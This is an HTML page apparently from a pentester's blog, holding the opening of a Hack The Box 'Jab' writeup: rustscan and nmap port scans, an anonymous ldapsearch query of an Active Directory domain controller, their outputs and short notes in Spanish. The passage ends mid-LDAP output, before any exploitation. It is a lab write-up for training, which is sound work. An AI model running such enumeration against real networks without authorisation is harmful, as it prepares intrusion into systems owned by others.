@@ -1,0 +1,688 @@
+<!doctype html>
+<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Bajo el teclado</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+  
+
+
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../pointed.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        pointedsec
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    if pentester.found == bug { make(pentester,states.happy) }
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="http://github.com/pointedsec" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://pointedsec.vercel.app" target="_blank">
+                            <i class="fas fa-globe fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
+                            <i class="fas fa-box fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <h1 id="hack-the-box-jab-writeup">Hack The Box: Jab Writeup</h1>
+<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Jab&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.230.215 --ulimit <span style="color:#ae81ff">5000</span> -g
+</span></span><span style="display:flex;"><span>10.129.230.215 -&gt; <span style="color:#f92672">[</span>53,88,135,139,389,445,464,593,636,3268,3269,5222,5223,5262,5263,5270,5269,7777,9389,5276,5275,5985,47001,49771,49703,49696,49694,49695,49673,49667,49666,49664,49665<span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5222,5223,5262,5263,5270,5269,7777,9389,5276,5275,5985,47001,49771,49703,49696,49694,49695,49673,49667,49666,49664,49665 -sCV 10.129.230.215 -oN allPorts
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-03 19:11 CEST
+</span></span><span style="display:flex;"><span>Stats: 0:00:31 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 54.55% <span style="color:#66d9ef">done</span>; ETC: 19:12 <span style="color:#f92672">(</span>0:00:25 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.230.215
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-08-03 15:12:13Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: jab.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-08-03T15:13:29+00:00; -1h59m39s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.jab.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-11-01T20:16:18
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-10-31T20:16:18
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: jab.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-08-03T15:13:29+00:00; -1h59m39s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.jab.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-11-01T20:16:18
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-10-31T20:16:18
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: jab.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.jab.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-11-01T20:16:18
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-10-31T20:16:18
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-08-03T15:13:29+00:00; -1h59m39s from scanner time.
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: jab.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-08-03T15:13:29+00:00; -1h59m39s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.jab.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-11-01T20:16:18
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-10-31T20:16:18
+</span></span><span style="display:flex;"><span>5222/tcp  open  jabber
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.jab.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-10-26T22:00:12
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-10-24T22:00:12
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   RPCCheck: 
+</span></span><span style="display:flex;"><span>|_    &lt;stream:error xmlns:stream<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://etherx.jabber.org/streams&#34;</span>&gt;&lt;not-well-formed xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;urn:ietf:params:xml:ns:xmpp-streams&#34;</span>/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
+</span></span><span style="display:flex;"><span>| xmpp-info: 
+</span></span><span style="display:flex;"><span>|   STARTTLS Failed
+</span></span><span style="display:flex;"><span>|   info: 
+</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
+</span></span><span style="display:flex;"><span>|     capabilities: 
+</span></span><span style="display:flex;"><span>|     unknown: 
+</span></span><span style="display:flex;"><span>|     errors: 
+</span></span><span style="display:flex;"><span>|       invalid-namespace
+</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     stream_id: 4pv9473fdx
+</span></span><span style="display:flex;"><span>|     compression_methods: 
+</span></span><span style="display:flex;"><span>|     features: 
+</span></span><span style="display:flex;"><span>|     xmpp: 
+</span></span><span style="display:flex;"><span>|_      version: 1.0
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>5223/tcp  open  ssl/jabber    Ignite Realtime Openfire Jabber server 3.10.0 or later
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.jab.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-10-26T22:00:12
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-10-24T22:00:12
+</span></span><span style="display:flex;"><span>| xmpp-info: 
+</span></span><span style="display:flex;"><span>|   STARTTLS Failed
+</span></span><span style="display:flex;"><span>|   info: 
+</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
+</span></span><span style="display:flex;"><span>|     capabilities: 
+</span></span><span style="display:flex;"><span>|     unknown: 
+</span></span><span style="display:flex;"><span>|     features: 
+</span></span><span style="display:flex;"><span>|     errors: 
+</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     compression_methods: 
+</span></span><span style="display:flex;"><span>|_    xmpp: 
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>5262/tcp  open  jabber        Ignite Realtime Openfire Jabber server 3.10.0 or later
+</span></span><span style="display:flex;"><span>| xmpp-info: 
+</span></span><span style="display:flex;"><span>|   STARTTLS Failed
+</span></span><span style="display:flex;"><span>|   info: 
+</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
+</span></span><span style="display:flex;"><span>|     capabilities: 
+</span></span><span style="display:flex;"><span>|     unknown: 
+</span></span><span style="display:flex;"><span>|     errors: 
+</span></span><span style="display:flex;"><span>|       invalid-namespace
+</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     stream_id: 31dkpsnust
+</span></span><span style="display:flex;"><span>|     compression_methods: 
+</span></span><span style="display:flex;"><span>|     features: 
+</span></span><span style="display:flex;"><span>|     xmpp: 
+</span></span><span style="display:flex;"><span>|_      version: 1.0
+</span></span><span style="display:flex;"><span>5263/tcp  open  ssl/jabber    Ignite Realtime Openfire Jabber server 3.10.0 or later
+</span></span><span style="display:flex;"><span>| xmpp-info: 
+</span></span><span style="display:flex;"><span>|   STARTTLS Failed
+</span></span><span style="display:flex;"><span>|   info: 
+</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
+</span></span><span style="display:flex;"><span>|     capabilities: 
+</span></span><span style="display:flex;"><span>|     unknown: 
+</span></span><span style="display:flex;"><span>|     features: 
+</span></span><span style="display:flex;"><span>|     errors: 
+</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     compression_methods: 
+</span></span><span style="display:flex;"><span>|_    xmpp: 
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.jab.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-10-26T22:00:12
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-10-24T22:00:12
+</span></span><span style="display:flex;"><span>5269/tcp  open  xmpp          Wildfire XMPP Client
+</span></span><span style="display:flex;"><span>| xmpp-info: 
+</span></span><span style="display:flex;"><span>|   STARTTLS Failed
+</span></span><span style="display:flex;"><span>|   info: 
+</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
+</span></span><span style="display:flex;"><span>|     capabilities: 
+</span></span><span style="display:flex;"><span>|     unknown: 
+</span></span><span style="display:flex;"><span>|     features: 
+</span></span><span style="display:flex;"><span>|     errors: 
+</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     compression_methods: 
+</span></span><span style="display:flex;"><span>|_    xmpp: 
+</span></span><span style="display:flex;"><span>5270/tcp  open  ssl/xmpp      Wildfire XMPP Client
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.jab.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-10-26T22:00:12
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-10-24T22:00:12
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>5275/tcp  open  jabber        Ignite Realtime Openfire Jabber server 3.10.0 or later
+</span></span><span style="display:flex;"><span>| xmpp-info: 
+</span></span><span style="display:flex;"><span>|   STARTTLS Failed
+</span></span><span style="display:flex;"><span>|   info: 
+</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
+</span></span><span style="display:flex;"><span>|     capabilities: 
+</span></span><span style="display:flex;"><span>|     unknown: 
+</span></span><span style="display:flex;"><span>|     errors: 
+</span></span><span style="display:flex;"><span>|       invalid-namespace
+</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     stream_id: am31c60wbx
+</span></span><span style="display:flex;"><span>|     compression_methods: 
+</span></span><span style="display:flex;"><span>|     features: 
+</span></span><span style="display:flex;"><span>|     xmpp: 
+</span></span><span style="display:flex;"><span>|_      version: 1.0
+</span></span><span style="display:flex;"><span>5276/tcp  open  ssl/jabber    Ignite Realtime Openfire Jabber server 3.10.0 or later
+</span></span><span style="display:flex;"><span>| xmpp-info: 
+</span></span><span style="display:flex;"><span>|   STARTTLS Failed
+</span></span><span style="display:flex;"><span>|   info: 
+</span></span><span style="display:flex;"><span>|     auth_mechanisms: 
+</span></span><span style="display:flex;"><span>|     capabilities: 
+</span></span><span style="display:flex;"><span>|     unknown: 
+</span></span><span style="display:flex;"><span>|     features: 
+</span></span><span style="display:flex;"><span>|     errors: 
+</span></span><span style="display:flex;"><span>|       <span style="color:#f92672">(</span>timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     compression_methods: 
+</span></span><span style="display:flex;"><span>|_    xmpp: 
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.jab.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-10-26T22:00:12
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-10-24T22:00:12
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>7777/tcp  open  socks5        <span style="color:#f92672">(</span>No authentication; connection failed<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| socks-auth-info: 
+</span></span><span style="display:flex;"><span>|_  No authentication
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49673/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49694/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49695/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49696/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49703/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49771/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port5222-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>8/3%Time<span style="color:#f92672">=</span>66AE64EC%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>SF:RPCCheck,9B,<span style="color:#e6db74">&#34;&lt;stream:error\x20xmlns:stream=\&#34;http://etherx\.jabber\.org
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:/streams\&#34;&gt;&lt;not-well-formed\x20xmlns=\&#34;urn:ietf:params:xml:ns:xmpp-stre
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ams\&#34;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-08-03T15:13:21
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: -1h59m39s, deviation: 0s, median: -1h59m39s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 86.39 seconds
+</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.230.215 -oN allPorts.UDP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-03 19:14 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.230.215
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.043s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1495</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE  SERVICE
+</span></span><span style="display:flex;"><span>53/udp   open   domain
+</span></span><span style="display:flex;"><span>88/udp   open   kerberos-sec
+</span></span><span style="display:flex;"><span>123/udp  open   ntp
+</span></span><span style="display:flex;"><span>1040/udp closed netarx
+</span></span><span style="display:flex;"><span>1053/udp closed remote-as
+</span></span></code></pre></div><p>De los escaneos con <code>nmap</code> sabemos que nos enfrentamos a un entorno de directorio activo.
+Descubrimos el dominio <code>jab.htb</code> y lo que seguramente sea el controlador de dominio, <code>DC01.jab.htb</code></p>
+<p>También vemos varios puertos que corresponden a un servicio <code>jabber</code> detectado por <code>nmap</code>. Y viendo que la máquina se llama Jab, lo tendré en cuenta. También vemos un servicio XMPP.</p>
+<p>Otro servicio curioso es el 7777/TCP que supuestamente corresponde a un proxy de tipo socks5.</p>
+<p>Ignite Realtime Openfire Jabber server 3.10.0.</p>
+<h1 id="other-enumeration">Other Enumeration</h1>
+<p>Enumerando el SMB no conseguí nada con una null session, ni tampoco en el RPC.</p>
+<p>Con LDAP tampoco consigo información relevante sin tener credenciales.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ldapsearch -H ldap://10.129.230.215 -x -s base -b <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#e6db74">&#34;(objectClass=*)&#34;</span> <span style="color:#e6db74">&#34;*&#34;</span> +
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># extended LDIF</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># LDAPv3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># base &lt;&gt; with scope baseObject</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># filter: (objectClass=*)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># requesting: * + </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>dn:
+</span></span><span style="display:flex;"><span>domainFunctionality: <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>forestFunctionality: <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>domainControllerFunctionality: <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>rootDomainNamingContext: DC<span style="color:#f92672">=</span>jab,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>ldapServiceName: jab.htb:dc01$@JAB.HTB
+</span></span><span style="display:flex;"><span>isGlobalCatalogReady: TRUE
+</span></span><span style="display:flex;"><span>supportedSASLMechanisms: GSSAPI
+</span></span><span style="display:flex;"><span>supportedSASLMechanisms: GSS-SPNEGO
+</span></span><span style="display:flex;"><span>supportedSASLMechanisms: EXTERNAL
+</span></span><span style="display:flex;"><span>supportedSASLMechanisms: DIGEST-MD5
+</span></span><span style="display:flex;"><span>supportedLDAPVersion: <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>supportedLDAPVersion: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxPoolThreads
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxPercentDirSyncRequests
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxDatagramRecv
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxReceiveBuffer
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: InitRecvTimeout
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxConnections
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxConnIdleTime
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxPageSize
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxBatchReturnMessages
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxQueryDuration
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxDirSyncDuration
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxTempTableSize
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxResultSetSize
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MinResultSets
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxResultSetsPerConn
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxNotificationPerConn
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxValRange
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxValRangeTransitive
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: ThreadMemoryLimit
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: SystemMemoryLimitPercent
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.319
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.801
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.473
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.528
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.417
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.619
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.841
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.529
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.805
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.521
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.970
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1338
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.474
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1339
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1340
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1413
+</span></span><span style="display:flex;"><span>supportedControl: 2.16.840.1.113730.3.4.9
+</span></span><span style="display:flex;"><span>supportedControl: 2.16.840.1.113730.3.4.10
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1504
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1852
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.802
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1907
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1948
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1974
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1341
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2026
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2064
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2065
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2066
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2090
